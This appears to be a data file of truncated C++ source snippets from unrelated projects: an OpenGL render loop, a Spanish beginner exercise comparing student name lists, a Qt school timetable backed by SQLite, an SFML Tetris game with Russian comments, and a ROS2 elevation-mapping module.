Texture(\"uvmap.DDS\");\n\t\tshader->setTexture(texture);\n\t\tmyGeom->setShader(shader);\n\t\tmyScene->addObject(myGeom);\n\t\t\n\n\t\tCamera* myCamera = new Camera();\n\t\tmyCamera->setPosition(glm::vec3(0,0,5));\n\t\tControls* myControls = new Controls(myCamera);\n\t\t//glPolygonMode( GL_FRONT_AND_BACK, GL_LINE );\n\t\t//Render loop\n\t\twhile( glfwGetKey(window, GLFW_KEY_ESCAPE ) != GLFW_PRESS && glfwWindowShouldClose(window) == 0 ){// Clear the screen\n\t\t\t\n\t\t\tif( glfwGetKey(window, GLFW_KEY_1) ==GLFW_PRESS)\n\t\t\t\tshader->setLightColor(vec3(9.0, 1.0, 1.0));\n\t\t\telse if( glfwGetKey(window, GLFW_KEY_2) ==GLFW_PRESS)\n\t\t\t\tshader->setLightColor(vec3(1.0, 9.0, 1.0));\n\t\t\telse if( glfwGetKey(window, GLFW_KEY_3) ==GLFW_PRESS)\n\t\t\t\tshader->setLightColor(vec3(1.0, 1.0, 9.0));\n\t\t\t// Clear the screen\n\t\t\tglClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT); // Also clear the depth buffer!!!\n\t\t\t\n\t\t\t// update camera controls with mouse input\n\t\t\tmyControls->update();\n\t\t\tmyScene->render(myCamera);\n\t\t\t\n\t\t\t// Swap buffers\n\t\t\tglfwSwapBuffers(window);\n\t\t\tglfwPollEvents();\n\t\t\t\n\t\t}\n\t\n\t\t\n\t\tdelete textur",
    "#include<iostream>\nusing namespace std;\n\nint main() {\n    int a, b, f = 0;  // Inicializar f a 0\n\n    cout << \"Nombres de los estudiantes de fundamentos de programacion:\" << endl;\n    cout << \"Indique la cantidad de estudiantes: \";\n    cin >> a;\n\n    char estudiantes1[a][50];\n    for(int i = 0; i < a; i++) {\n        cout << \"Ingrese el nombre numero \" << i + 1 << \": \";\n        cin >> estudiantes1[i];\n    }\n\n    cout << \"Nombres de los estudiantes de programacion grafica:\" << endl;\n    cout << \"Indique la cantidad de estudiantes: \";\n    cin >> b;\n\n    char estudiantes2[b][50];\n    for(int k = 0; k < b; k++) {\n        cout << \"Ingrese el nombre numero \" << k + 1 << \": \";\n        cin >> estudiantes2[k];\n    }\n\n    // La cantidad m\u00e1xima de comunes no puede ser mayor que el menor de los dos tama\u00f1os\n    char comunes[(a < b) ? a : b][50];\n\n    for(int j = 0; j < a; j++) {\n        for(int k = 0; k < b; k++) {\n            // Comparar cadenas manualmente\n            bool iguales = true;\n            for(int l = 0; l < 50; l++) {\n                if(estudiantes1[j][l] != estudiantes2[k][l]) {\n                    iguales = false;\n                    break;\n                }\n                // Fin de cadena\n                if(estudiantes1[j][l] == '\\0' || estudiantes2[k][l] == '\\0') {\n                    break;\n                }\n            }\n            if(iguales) {\n                // Copiar cadena manualmente\n                for(int l = 0; l < 50; l++) {\n                    comunes[f][l] = estudiantes1[j][l];\n                    if(estudiantes1[j][l] == '\\0') {\n                        break;\n                    }\n                }\n                f++;\n                break;  // Salir del bucle interno si se encontr\u00f3 un nombre com\u00fan\n            }\n        }\n    }\n\n    if(f > 0) {\n        cout << \"Nombres comunes:\" << endl;\n        for(int y = 0; y < f; y++) {\n            cout << comunes[y] << endl;\n        }\n    } else {\n        cout << \"No hay nombres comunes.\" << endl;\n    }\n\n    return 0;\n}\n\n",
    "#include \"schooltimetable.h\"\r\n#include \"ui_schooltimetable.h\"\r\n#include <QTableView>\r\n#include <QStandardItemModel>\r\n#include <QSqlDatabase>\r\n#include <QMessageBox>\r\n#include <QPushButton>\r\n#include <QTableWidgetItem>\r\n#include <QVector>\r\n#include <QList>\r\n\r\nQList<int> convertStringToIntList(const QString& input, const QString& delimiter) {\r\n    // \u5c06\u8f93\u5165\u5b57\u7b26\u4e32\u6839\u636e\u6307\u5b9a\u7684\u7b26\u53f7\u5206\u5272\u6210QStringList\r\n    QStringList stringList = input.split(delimiter, QString::SkipEmptyParts);\r\n    QList<int> intList;\r\n\r\n    // \u5c06QStringList\u8f6c\u6362\u4e3aQList<int>\r\n    for (const QString& str : stringList) {\r\n        bool ok;\r\n        int num = str.toInt(&ok);\r\n        if (ok) {\r\n            intList.append(num);\r\n        } else {\r\n            qDebug() << \"Conversion failed for\" << str;\r\n        }\r\n    }\r\n\r\n    return intList;\r\n}\r\n\r\nschooltimetable::schooltimetable(const QString& username, int id, QWidget *parent) :\r\n    QWidget(parent),\r\n    ui(new Ui::schooltimetable)\r\n{\r\n    ui->setupUi(this);\r\n    this->username=username;\r\n    this->id=id;\r\n\r\n    // \u7ed1\u5b9atable\r\n    QStandardItemModel* course_model = new QStandardItemModel();\r\n    QTableWidget *tableWidget= ui->tableWidget;\r\n    tableWidget->setColumnCount(7);\r\n    QStringList headers;\r\n    headers << \"\u5468\u4e00\" << \"\u5468\u4e8c\" << \"\u5468\u4e09\" << \"\u5468\u56db\" << \"\u5468\u4e94\" << \"\u5468\u516d\" << \"\u5468\u65e5\";\r\n    tableWidget->setHorizontalHeaderLabels(headers);\r\n    // \u8bbe\u7f6e\u5217\u5bbd\u81ea\u52a8\u8c03\u6574\r\n    tableWidget->horizontalHeader()->setSectionResizeMode(QHeaderView::Stretch);\r\n\r\n    // \u8bbe\u7f6e\u884c\u6570\r\n    tableWidget->setRowCount(8);\r\n\r\n    // \u8bbe\u7f6e\u884c\u9ad8\u81ea\u52a8\u8c03\u6574\r\n    for (int row = 0; row < tableWidget->rowCount(); ++row) {\r\n        tableWidget->setRowHeight(row, tableWidget->height() / tableWidget->rowCount());\r\n    }\r\n\r\n    // \u5f53\u8868\u683c\u5927\u5c0f\u6539\u53d8\u65f6\u91cd\u65b0\u8c03\u6574\u884c\u9ad8\r\n    connect(tableWidget->verticalHeader(), &QHeaderView::sectionResized, [tableWidget]() {\r\n        for (int row = 0; row < tableWidget->rowCount(); ++row) {\r\n            tableWidget->setRowHeight(row, tableWidget->height() / tableWidget->rowCount());\r\n        }\r\n    });\r\n    tableWidget->verticalHeader()->setSectionResizeMode(QHeaderView::Fixed);\r\n\r\n    //\u52a0\u8f7d\u6570\u636e\r\n    struct Course{\r\n        QString name;\r\n        QString teacher;\r\n        QString place;\r\n        QList<int> time;\r\n        QList<int> date;\r\n        QList<int> week;\r\n\r\n    };\r\n\r\n    // \u8fde\u63a5\u6570\u636e\u5e93\r\n    QString dbName = \"database.db\";\r\n    QString dbPath = QCoreApplication::applicationDirPath() + \"./\" + dbName;  // Use a relative path\r\n\r\n    QSqlDatabase db = QSqlDatabase::addDatabase(\"QSQLITE\");\r\n    db.setDatabaseName(dbPath);\r\n\r\n    if (!db.open()) {\r\n        QMessageBox::critical(nullptr, \"\u9519\u8bef\", \"\u6570\u636e\u5e93\u6253\u5f00\u5931\u8d25\uff1a\" + db.lastError().text());\r\n        return;\r\n    }\r\n\r\n    QVector<Course> cList;\r\n    QSqlQuery query;\r\n    //\u663e\u793a\u5b66\u751f\u5df2\u9009\u8bfe\u7a0b\r\n    query.prepare(\"SELECT Course.name, Course.teacher , Course.place, Course.time, Course.date, Course.week \"\r\n               \"FROM SC \"\r\n               \"INNER JOIN Course ON SC.course_id = Course.id \"\r\n               \"WHERE SC.student_id = :userId\");\r\n    query.bindValue(\":userId\", id);\r\n    query.exec();\r\n\r\n    while(query.next()){\r\n        Course course;\r\n        course.name = query.value(0).toString();\r\n        course.teacher = query.value(1).toString();\r\n        course.place = query.value(2).toString();\r\n        course.time = convertStringToIntList(query.value(3).toString(),\",\");\r\n        course.date = convertStringToIntList(query.value(4).toString(),\",\");\r\n        course.week = convertStringToIntList(query.value(5).toString(),\"-\");\r\n        cList.append(course);\r\n    }\r\n\r\n\r\n\r\n    // \u5c06\u8bfe\u7a0b\u6570\u636e\u6620\u5c04\u5230\u8868\u683c\u4e2d\r\n    for (const Course& course : cList) {\r\n        QString courseInfo = course.name + \"\\n\" + course.teacher + \"\\n\" + course.place;\r\n        for (int time : course.time) {\r\n            for (int date : course.date) {\r\n                int row = time - 1; // time 1-8\u5bf9\u5e94row 0-7\r\n                int col = date - 1; // date 1-7\u5bf9\u5e94col 0-6\r\n                QTableWidgetItem *item = new QTableWidgetItem(courseInfo);\r\n                tableWidget->setItem(row, col, item);\r\n            }\r\n        }\r\n    }\r\n\r\n}\r\n\r\nschooltimetable::~schooltimetable()\r\n{\r\n    delete ui;\r\n}\r\n\r\nvoid schooltimetable::on_refresh_clicked()\r\n{\r\n\r\n    //\u52a0\u8f7d\u6570\u636e\r\n    struct Course{\r\n        QString name;\r\n        QString teacher;\r\n        QString place;\r\n        QList<int> time;\r\n        QList<int> date;\r\n        QList<int> week;\r\n\r\n    };\r\n\r\n    // \u8fde\u63a5\u6570\u636e\u5e93\r\n    QString dbName = \"database.db\";\r\n    QString dbPath = QCoreApplication::applicationDirPath() + \"./\" + dbName;  // Use a relative path\r\n\r\n    QSqlDatabase db = QSqlDatabase::addDatabase(\"QSQLITE\");\r\n    db.setDatabaseName(dbPath);\r\n\r\n    if (!db.open()) {\r\n        QMessageBox::critical(nullptr, \"\u9519\u8bef\", \"\u6570\u636e\u5e93\u6253\u5f00\u5931\u8d25\uff1a\" + db.lastError().text());\r\n        return;\r\n    }\r\n\r\n    // \u6e05\u9664\u8868\u683c\u73b0\u6709\u6570\u636e\r\n    ui->tableWidget->clearContents();\r\n\r\n    // \u91cd\u65b0\u52a0\u8f7d\u6570\u636e\r\n    QVector<Course> cList;\r\n    QSqlQuery query;\r\n    query.prepare(\"SELECT Course.name, Course.teacher, Course.place, Course.time, Course.date, Course.week \"\r\n                  \"FROM SC \"\r\n                  \"INNER JOIN Course ON SC.course_id = Co",
    "\ufeff#include <SFML/Graphics.hpp>\n#include <time.h>\n\nusing namespace sf;\n\nconst int M = 20;// \u0432\u044b\u0441\u043e\u0442\u0430 \u0438\u0433\u0440\u043e\u0432\u043e\u0433\u043e \u043f\u043e\u043b\u044f\nconst int N = 10;// \u0448\u0438\u0440\u0438\u043d\u0430 \u0438\u0433\u0440\u043e\u0432\u043e\u0433\u043e \u043f\u043e\u043b\u044f\n\nint field[M][N] = { 0 };// \u0438\u0433\u0440\u043e\u0432\u043e\u0435 \u043f\u043e\u043b\u0435\nint w = 34;\n\n//-----------------------------------------------------------------------------------\nstruct Point\n{\n\tint x, y;\n}a[4], b[4];\n//-----------------------------------------------------------------------------------\n// \u041c\u0430\u0441\u0441\u0438\u0432 \u0444\u0438\u0433\u0443\u0440\u043e\u043a-\u0442\u0435\u0442\u0440\u0430\u043c\u0438\u043d\u043e\n//-----------------------------------------------------------------------------------\nint figures[7][4] = {\n\t 1,3,5,7, // I\n\t 2,4,5,7, // S\n\t 3,5,4,6, // Z\n\t 3,5,4,7, // T\n\t 2,3,5,7, // L\n\t 3,5,7,6, // J\n\t 2,3,4,5, // O\n};\n//-----------------------------------------------------------------------------------\n// \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043d\u0430 \u0432\u044b\u0445\u043e\u0434 \u0437\u0430 \u0433\u0440\u0430\u043d\u0438\u0446\u044b \u0438\u0433\u0440\u043e\u0432\u043e\u0433\u043e \u043f\u043e\u043b\u044f\n//-----------------------------------------------------------------------------------\nbool check() {\n\tfor (int i = 0; i < 4; i++)\n\t\tif (a[i].x < 0 || a[i].x >= N || a[i].y >= M)\n\t\t\treturn 0;\n\t\telse if (field[a[i].y][a[i].x])\n\t\t\treturn 0;\n\n\treturn 1;\n}\n//-----------------------------------------------------------------------------------\nint main()\n{\n\tsrand(time(0));\n\n\tRenderWindow window(VideoMode(N * w, M * w), \"Tetris!\");\n\n\t// \u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0438 \u0437\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u0442\u0435\u043a\u0441\u0442\u0443\u0440\u044b\n\tTexture t;\n\tt.loadFromFile(\"D:/Obuchenie/SEGARSS/Tetris/Paint/tiles.png\");\n\t// \u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0441\u043f\u0440\u0430\u0439\u0442\u0430\n\tSprite tiles(t);\n\n\t// \u041f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0435 \u0434\u043b\u044f \u0433\u043e\u0440\u0438\u0437\u043e\u043d\u0442\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u043f\u0435\u0440\u0435\u043c\u0435\u0449\u0435\u043d\u0438\u044f \u0438 \u0432\u0440\u0430\u0449\u0435\u043d\u0438\u044f\n\tint dx = 0;// \u041f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0430\u044f \u0434\u043b\u044f \u0433\u043e\u0440\u0438\u0437\u043e\u043d\u0442\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u043f\u0435\u0440\u0435\u043c\u0435\u0449\u0435\u043d\u0438\u044f \u0442\u0435\u0442\u0440\u0430\u043c\u0438\u043d\u043e\n\tint colorNum = 1;\n\tbool rotate = false;// \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0430\u044f \u0434\u043b\u044f \u0432\u0440\u0430\u0449\u0435\u043d\u0438\u044f \u0442\u0435\u0442\u0440\u0430\u043c\u0438\u043d\u043e\n\t// \u041f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0435 \u0434\u043b\u044f \u0442\u0430\u0439\u043c\u0435\u0440\u0430 \u0438 \u0437\u0430\u0434\u0435\u0440\u0436\u043a\u0438\n\tfloat timer = 0, delay = 0.3;\n\t// \u0427\u0430\u0441\u044b (\u0442\u0430\u0439\u043c\u0435\u0440)\n\tClock clock;\n\tbool ad = true;\n\n\t// \u0413\u043b\u0430\u0432\u043d\u044b\u0439 \u0446\u0438\u043a\u043b \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u044f: \u0432\u044b\u043f\u043e\u043b\u043d\u044f\u0435\u0442\u0441\u044f, \u043f\u043e\u043a\u0430 \u043e\u0442\u043a\u0440\u044b\u0442\u043e \u043e\u043a\u043d\u043e\n\twhile (window.isOpen())\n\t{\n\t\t// \u041f\u043e\u043b\u0443\u0447\u0430\u0435\u043c \u0432\u0440\u0435\u043c\u044f, \u043f\u0440\u043e\u0448\u0435\u0434\u0448\u0435\u0435 \u0441 \u043d\u0430\u0447\u0430\u043b\u0430 \u043e\u0442\u0441\u0447\u0435\u0442\u0430, \u0438 \u043a\u043e\u043d\u0432\u0435\u0440\u0442\u0438\u0440\u0443\u0435\u043c \u0435\u0433\u043e \u0432 \u0441\u0435\u043a\u0443\u043d\u0434\u044b\n\t\tfloat time = clock.getElapsedTime().asSeconds();\n\t\tclock.restart();\n\t\ttimer += time;\n\n\t\t// \u041e\u0431\u0440\u0430\u0431\u0430\u0442\u044b\u0432\u0430\u0435\u043c \u0441\u043e\u0431\u044b\u0442\u0438\u044f \u0432 \u0446\u0438\u043a\u043b\u0435\n\t\tEvent event;\n\t\twhile (window.pollEvent(event))\n\t\t{\n\t\t\t// \u041f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c \u043d\u0430\u0436\u0430\u043b \u043d\u0430 \u00ab\u043a\u0440\u0435\u0441\u0442\u0438\u043a\u00bb \u0438 \u0445\u043e\u0447\u0435\u0442 \u0437\u0430\u043a\u0440\u044b\u0442\u044c \u043e\u043a\u043d\u043e?\n\t\t\tif (event.type == Event::Closed)\n\t\t\t\t// \u0442\u043e\u0433\u0434\u0430 \u0437\u0430\u043a\u0440\u044b\u0432\u0430\u0435\u043c \u0435\u0433\u043e\n\t\t\t\twindow.close();\n\n\t\t\t// \u0411\u044b\u043b\u0430 \u043b\u0438 \u043d\u0430\u0436\u0430\u0442\u0430 \u043a\u043b\u0430\u0432\u0438\u0448\u0430 \u043d\u0430 \u043a\u043b\u0430\u0432\u0438\u0430\u0442\u0443\u0440\u0435?\n\t\t\tif (event.type == Event::KeyPressed)\n\t\t\t\t// \u042d\u0442\u0430 \u043a\u043d\u043e\u043f\u043a\u0430 \u2013 \u0441\u0442\u0440\u0435\u043b\u043a\u0430 \u0432\u0432\u0435\u0440\u0445?\n\t\t\t\tif (event.key.code == Keyboard::Up)\n\t\t\t\t\trotate = true;\n\t\t\t// \u0418\u043b\u0438 \u0441\u0442\u0440\u0435\u043b\u043a\u0430 \u0432\u043f\u0440\u0430\u0432\u043e?\n\t\t\t\telse if (event.key.code == Keyboard::Right)\n\t\t\t\t\tdx = 1;\n\t\t\t// \u0418\u043b\u0438 \u043c\u043e\u0436\u0435\u0442 \u0441\u0442\u0440\u0435\u043b\u043a\u0430 \u0432\u043b\u0435\u0432\u043e?\n\t\t\t\telse if (event.key.code == Keyboard::Left)\n\t\t\t\t\tdx = -1;\n\t\t}\n\n\n\t\tif (Keyboard::isKeyPressed(Keyboard::Down))\n\t\t\tdelay = 0.05;\n\n\t\t// \u0413\u043e\u0440\u0438\u0437\u043e\u043d\u0442\u0430\u043b\u044c\u043d\u043e\u0435 \u043f\u0435\u0440\u0435\u043c\u0435\u0449\u0435\u043d\u0438\u0435\n\t\tfor (int i = 0; i < 4; i++) {\n\t\t\tb[i] = a[i];\n\t\t\ta[i].x += dx;\n\t\t}\n\n\t\t// \u0415\u0441\u043b\u0438 \u0432\u044b\u0448\u043b\u0438 \u0437\u0430 \u043f\u0440\u0435\u0434\u0435\u043b\u044b \u043f\u043e\u043b\u044f \u043f\u043e\u0441\u043b\u0435 \u043f\u0435\u0440\u0435\u043c\u0435\u0449\u0435\u043d\u0438\u044f, \u0442\u043e \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u043c \u0441\u0442\u0430\u0440\u044b\u0435 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u044b \n\t\tif (!check()) {\n\t\t\tfor (int i = 0; i < 4; i++)\n\t\t\t\ta[i] = b[i];\n\t\t}\n\n\t\t// \u0412\u0440\u0430\u0449\u0435\u043d\u0438\u0435\n\t\tif (rotate) {\n\t\t\tPoint p = a[1];// \u0443\u043a\u0430\u0437\u044b\u0432\u0430\u0435\u043c \u0446\u0435\u043d\u0442\u0440 \u0432\u0440\u0430\u0449\u0435\u043d\u0438\u044f\n\t\t\tfor (int i = 0; i < 4; i++) {\n\t\t\t\tint x = a[i].y - p.y;// y - y0\n\t\t\t\tint y = a[i].x - p.x;// x - x0\n\n\t\t\t\ta[i].x = p.x - x;\n\t\t\t\ta[i].y = p.y + y;\n\t\t\t}\n\n\t\t\t// \u0415\u0441\u043b\u0438 \u0432\u044b\u0448\u043b\u0438 \u0437\u0430 \u043f\u0440\u0435\u0434\u0435\u043b\u044b \u043f\u043e\u043b\u044f \u043f\u043e\u0441\u043b\u0435 \u043f\u043e\u0432\u043e\u0440\u043e\u0442\u0430, \u0442\u043e \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u043c \u0441\u0442\u0430\u0440\u044b\u0435 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u044b \n\t\t\tif (!check()) {\n\t\t\t\tfor (int i = 0; i < 4; i++)\n\t\t\t\t\ta[i] = b[i];\n\t\t\t}\n\t\t}\n\n\t\t// \u0414\u0432\u0438\u0436\u0435\u043d\u0438\u0435 \u0442\u0435\u0442\u0440\u0430\u043c\u0438\u043d\u043e \u0432\u043d\u0438\u0437 (\u00ab\u0442\u0438\u043a\u00bb \u0442\u0430\u0439\u043c\u0435\u0440\u0430)\n\t\tif (timer > delay) {\n\t\t\t// \u0413\u043e\u0440\u0438\u0437\u043e\u043d\u0442\u0430\u043b\u044c\u043d\u043e\u0435 \u043f\u0435\u0440\u0435\u043c\u0435\u0449\u0435\u043d\u0438\u0435\n\t\t\tfor (int i = 0; i < 4; i++) {\n\t\t\t\tb[i] = a[i];\n\t\t\t\ta[i].y += 1;\n\t\t\t}\n\n\t\t\t// \u0415\u0441\u043b\u0438 \u0432\u044b\u0448\u043b\u0438 \u0437\u0430 \u043f\u0440\u0435\u0434\u0435\u043b\u044b \u043f\u043e\u043b\u044f \u043f\u043e\u0441\u043b\u0435 \u043f\u0435\u0440\u0435\u043c\u0435\u0449\u0435\u043d\u0438\u044f, \u0442\u043e \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u043c \u0441\u0442\u0430\u0440\u044b\u0435 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u044b\n\t\t\tif (!check()) {\n\t\t\t\tfor (int i = 0; i < 4; i++)\n\t\t\t\t\tfield[b[i].y][b[i].x] = colorNum;\n\t\t\t\tcolorNum = 1 + rand() % 7;\n\t\t\t\tint n = rand() % 7;// \u0437\u0430\u0434\u0430\u0435\u043c \u0442\u0438\u043f \u0442\u0435\u0442\u0440\u0430\u043c\u0438\u043d\u043e\n\t\t\t\t// \u041f\u0435\u0440\u0432\u043e\u0435 \u043f\u043e\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0442\u0435\u0442\u0440\u0430\u043c\u0438\u043d\u043e \u043d\u0430 \u043f\u043e\u043b\u0435?\n\t\t\t\tfor (int i = 0; i < 4; i++) {\n\t\t\t\t\ta[i].x = figures[n][i] % 2;\n\t\t\t\t\ta[i].y = figures[n][i] / 2;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\ttimer = 0;\n\t\t}\n\n\t\t// \u041f\u0435\u0440\u0432\u043e\u0435 \u043f\u043e\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0442\u0435\u0442\u0440\u0430\u043c\u0438\u043d\u043e \u043d\u0430 \u043f\u043e\u043b\u0435?\n\t\tif (ad) {\n\t\t\tint n = rand() % 7;// \u0443\u043a\u0430\u0437\u044b\u0432\u0430\u0435\u043c \u0442\u0438\u043f \u0442\u0435\u0442\u0440\u0430\u043c\u0438\u043d\u043e\n\t\t\t// \u041f\u0435\u0440\u0432\u043e\u0435 \u043f\u043e\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0442\u0435\u0442\u0440\u0430\u043c\u0438\u043d\u043e \u043d\u0430 \u043f\u043e\u043b\u0435?\n\t\t\tif (a[0].x == 0)\n\t\t\t\tfor (int i = 0; i < 4; i++) {\n\t\t\t\t\ta[i].x = figures[n][i] % 2;\n\t\t\t\t\ta[i].y = figures[n][i] / 2;\n\t\t\t\t}\n\t\t\tad = false;\n\t\t}\n\n\t\tint k = M - 1;\n\t\tfor (int i = M - 1; i > 0; i--) {\n\t\t\tint count = 0;\n\t\t\tfor (int j = 0; j < N; j++) {\n\t\t\t\tif (field[i][j])\n\t\t\t\t\tcount++;\n\t\t\t\tfield[k][j] = field[i][j];\n\t\t\t}\n\t\t\tif (count < N)\n\t\t\t\tk--;\n\t\t}\n\n\t\tdx = 0; // \u0433\u043e\u0440\u0438\u0437\u043e\u043d\u0442\u0430\u043b\u044c\u043d\u043e\u0435 \u043f\u0435\u0440\u0435\u043c\u0435\u0449\u0435\u043d\u0438\u0435\n\t\trotate = false;// \u0432\u0440\u0430\u0449\u0435\u043d\u0438\u0435\n\t\tdelay = 0.3;// \u0446\u0432\u0435\u0442\n\n\t\t// \u041e\u0442\u0440\u0438\u0441\u043e\u0432\u043a\u0430 \u043e\u043a\u043d\u0430\n\t\twindow.clear(Color::White);\n\n\t\tfor (int i = 0; i < M; i++)\n\t\t\tfor (int j = 0; j < N; j++) {\n\t\t\t\tif (field[i][j] == 0)\n\t\t\t\t\tcontinue;\n\t\t\t\ttiles.setTextureRect(IntRect(field[i][j] * w, 0, w, w));\n\t\t\t\ttiles.setPosition(j * w, i * w);\n\t\t\t\twindow.draw(tiles);\n\t\t\t}\n\n\t\tfor (int i = 0; i < 4; i++) {\n\t\t\ttiles.setTextureRect(IntRect(colorNum * w, 0, w, w));\n\t\t\t// \u0423\u0441\u0442\u0430\u043d\u0430\u0432\u043b\u0438\u0432\u0430\u0435\u043c \u043f\u043e\u0437\u0438\u0446\u0438\u044e \u043a\u0430\u0436\u0434\u043e\u0433\u043e \u043a\u0443\u0441\u043e\u0447\u043a\u0430 \u0442\u0435\u0442\u0440\u0430\u043c\u0438\u043d\u043e\n\t\t\ttiles.setPosition(a[i].x * w, a[i].y * w);\n\t\t\t// \u041e\u0442\u0440\u0438\u0441\u043e\u0432\u043a\u0430 \u0441\u043f\u0440\u0430\u0439\u0442\u0430\n\t\t\twindow.draw(tiles);\n\t\t}\n\n\t\t// \u041e\u0442\u0440\u0438\u0441\u043e\u0432\u043a\u0430 \u043e\u043a\u043d\u0430\n\t\twindo",
    "/*\n * ElevationMap.cpp\n *\n *  Created on: Feb 5, 2014\n *      Author: P\u00e9ter Fankhauser\n *\t Institute: ETH Zurich, ANYbotics\n */\n\n#include <cmath>\n#include <cstring>\n\n#include <grid_map_msgs/msg/grid_map.hpp>\n#include <rclcpp/rclcpp.hpp>\n#include <Eigen/Dense>\n\n#include \"elevation_mapping/ElevationMap.hpp\"\n#include \"elevation_mapping/ElevationMapFunctors.hpp\"\n#include \"elevation_mapping/PointXYZRGBConfidenceRatio.hpp\"\n#include \"elevation_mapping/WeightedEmpiricalCumulativeDistributionFunction.hpp\"\n\nnamespace {\n/**\n * Store an unsigned integer value in a float\n * @param input integer\n * @return A float with the bit pattern of the input integer\n */\nfloat intAsFloat(const uint32_t input) {\n  float output;\n  std::memcpy(&output, &input, sizeof(uint32_t));\n  return output;\n}\n}  // namespace\n\nnamespace elevation_mapping {\n\nElevationMap::ElevationMap(std::shared_ptr<rclcpp::Node> nodeHandle)\n    : nodeHandle_(nodeHandle),\n      rawMap_({\"elevation\", \"variance\", \"horizontal_variance_x\", \"horizontal_variance_y\", \"horizontal_variance_xy\", \"color\", \"time\",\n               \"dynamic_time\", \"lowest_scan_point\", \"sensor_x_at_lowest_scan\", \"sensor_y_at_lowest_scan\", \"sensor_z_at_lowest_scan\"}),\n      fusedMap_({\"elevation\", \"upper_bound\", \"lower_bound\", \"color\"}),\n      // FIXME: Postprocessor num threads should be same as number of filters\n      postprocessorPool_(nodeHandle_->get_parameter(\"postprocessor_num_threads\").as_int(), nodeHandle_),\n      hasUnderlyingMap_(false),\n      minVariance_(0.000009),\n      maxVariance_(0.0009),\n      mahalanobisDistanceThreshold_(2.5),\n      multiHeightNoise_(0.000009),\n      minHorizontalVariance_(0.0001),\n      maxHorizontalVariance_(0.05),\n      enableVisibilityCleanup_(true),\n      enableContinuousCleanup_(false),\n      visibilityCleanupDuration_(0.0),\n      scanningDuration_(1.0) {\n  rawMap_.setBasicLayers({\"elevation\", \"variance\"});\n  fusedMap_.setBasicLayers({\"elevation\", \"upper_bound\", \"lower_bound\"});\n  clear();\n\n  elevationMapFusedPublisher_ = nodeHandle_->create_publisher<grid_map_msgs::msg::GridMap>(\"elevation_map\", 1);\n  if (!underlyingMapTopic_.empty()) {\n    underlyingMapSubscriber_ = nodeHandle_->create_subscription<grid_map_msgs::msg::GridMap>(underlyingMapTopic_, 1, std::bind(&ElevationMap::underlyingMapCallback, this, std::placeholders::_1));\n  }\n  // TODO(max): if (enableVisibilityCleanup_) when parameter cleanup is ready.\n  visibilityCleanupMapPublisher_ = nodeHandle_->create_publisher<grid_map_msgs::msg::GridMap>(\"visibility_cleanup_map\", 1);\n\n  initialTime_ = nodeHandle_->get_clock()->now();\n}\n\nElevationMap::~ElevationMap() = default;\n\nvoid ElevationMap::setGeometry(const grid_map::Length& length, const double& resolution, const grid_map::Position& position) {\n  boost::recursive_mutex::scoped_lock scopedLockForRawData(rawMapMutex_);\n  boost::recursive_mutex::scoped_lock scopedLockForFusedData(fusedMapMutex_);\n  rawMap_.setGeometry(length, resolution, position);\n  fusedMap_.setGeometry(length, resolution, position);\n  RCLCPP_INFO_STREAM(nodeHandle_->get_logger(), \"Elevation map grid resized to \" << rawMap_.getSize()(0) << \" rows and \" << rawMap_.getSize()(1) << \" columns.\");\n}\n\nbool ElevationMap::add(const PointCloudType::Ptr pointCloud, Eigen::VectorXf& pointCloudVariances, const rclcpp::Time& timestamp,\n                       const Eigen::Affine3d& transformationSensorToMap) {\n  if (static_cast<unsigned int>(pointCloud->size()) != static_cast<unsigned int>(pointCloudVariances.size())) {\n    RCLCPP_ERROR(nodeHandle_->get_logger(), \"ElevationMap::add: Size of point cloud (%i) and variances (%i) do not agree.\", (int)pointCloud->size(),\n              (int)pointCloudVariances.size());\n    return false;\n  }\n\n  // Initialization for time calculation.\n  const auto methodStartTime = std::chrono::system_clock::now();\n  const rclcpp::Time currentTime = nodeHandle_->get_clock()->now();\n  const float currentTimeSecondsPattern{intAsFloat(static_cast<uint32_t>(static_cast<uint64_t>(currentTime.seconds())))};\n  boost::recursive_mutex::scoped_lock scopedLockForRawData(rawMapMutex_);\n\n  // Update initial time if it is not initialized.\n  if (initialTime_.seconds() == 0) {\n    initialTime_ = timestamp;\n  }\n  const float scanTimeSinceInitialization = (timestamp - initialTime_).seconds();\n\n  // Store references for efficient interation.\n  auto& elevationLayer = rawMap_[\"elevation\"];\n  auto& varianceLayer = rawMap_[\"variance\"];\n  auto& horizontalVarianceXLayer = rawMap_[\"horizontal_variance_x\"];\n  auto& horizontalVarianceYLayer = rawMap_[\"horizontal_variance_y\"];\n  auto& horizontalVarianceXYLayer = rawMap_[\"horizontal_variance_xy\"];\n  auto& colorLayer = rawMap_[\"color\"];\n  auto& timeLayer = rawMap_[\"time\"];\n  auto& dynamicTimeLayer = rawMap_[\"dynamic_time\"];\n  auto& lowestScanPointLayer = rawMap_[\"lowest_scan_point\"];\n  auto& sensorXatLowestScanLayer = rawMap_[\"sensor_x_at_lowest_scan\"];\n  auto& sensorYatLowestScanLayer = rawMap_[\"sensor_y_at_lowest_scan\"];\n  auto& sensorZatLowestScanLa",
